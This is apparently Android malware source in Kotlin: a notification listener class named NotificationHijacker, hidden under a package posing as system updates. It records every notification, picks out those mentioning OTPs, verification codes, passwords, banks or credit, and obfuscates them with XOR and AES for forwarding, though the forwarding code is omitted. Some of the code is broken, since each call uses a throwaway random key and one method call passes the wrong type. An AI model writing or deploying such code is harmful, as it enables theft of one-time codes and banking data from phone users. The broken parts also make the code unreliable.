package com.system.updates.modules

import android.app.Notification
import android.content.Context
import android.os.Build
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Base64
import java.security.SecureRandom
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec

class NotificationHijacker : NotificationListenerService() {
    private val r = SecureRandom()
    private val mask = byteArrayOf(0x6D, 0x7E, 0x8F.toByte(), 0x90.toByte(), 0xA1.toByte(), 0xB2.toByte(), 0xC3.toByte(), 0xD4.toByte())

    companion object {
        private var instance: NotificationHijacker? = null
        private var lastNotifications = mutableListOf<String>()

        fun getLastNotifications(): List<String> = lastNotifications
    }

    override fun onCreate() {
        super.onCreate()
        instance = this
    }

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val notification = sbn.notification
        val extras = notification.extras
        val title = extras.getString(Notification.EXTRA_TITLE) ?: ""
        val text = extras.getString(Notification.EXTRA_TEXT) ?: ""
        val packageName = sbn.packageName

        val full = "$packageName|$title|$text"
        lastNotifications.add(full)
        if (lastNotifications.size > 50) {
            lastNotifications.removeAt(0)
        }

        // Encrypt sensitive data
        if (isSensitive(packageName, title, text)) {
            val encrypted = encryptNotification(full)
            // Store or forward encrypted data (implementation omitted)
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification) {
        // handle removal if needed
    }

    private fun isSensitive(pkg: String, title: String, text: String): Boolean {
        val sensitiveKeywords = listOf("otp", "code", "password", "verification", "bank", "credit")
        return sensitiveKeywords.any { title.contains(it, true) || text.contains(it, true) }
    }

    private fun xor(data: ByteArray): ByteArray {
        return data.mapIndexed { i, b -> (b.toInt() xor mask[i % mask.size].toInt() xor i).toByte() }.toByteArray()
    }

    private fun aesEnc(data: ByteArray, key: ByteArray): ByteArray {
        val c = Cipher.getInstance("AES/GCM/NoPadding")
        val iv = ByteArray(12).also { r.nextBytes(it) }
        val ks = SecretKeySpec(key, "AES")
        c.init(Cipher.ENCRYPT_MODE, ks, GCMParameterSpec(128, iv))
        return iv + c.doFinal(data)
    }

    fun encryptNotification(plain: String): String {
        val raw = plain.toByteArray()
        val x = xor(raw)
        val key = ByteArray(32).also { r.nextBytes(it) } // dummy key, should use proper key mgmt
        val enc = aesEnc(x, key)
        return Base64.encodeToString(enc, Base64.NO_WRAP)
    }

    fun requestPermission(ctx: Context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
            ctx.startActivity(android.provider.Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
        }
    }
}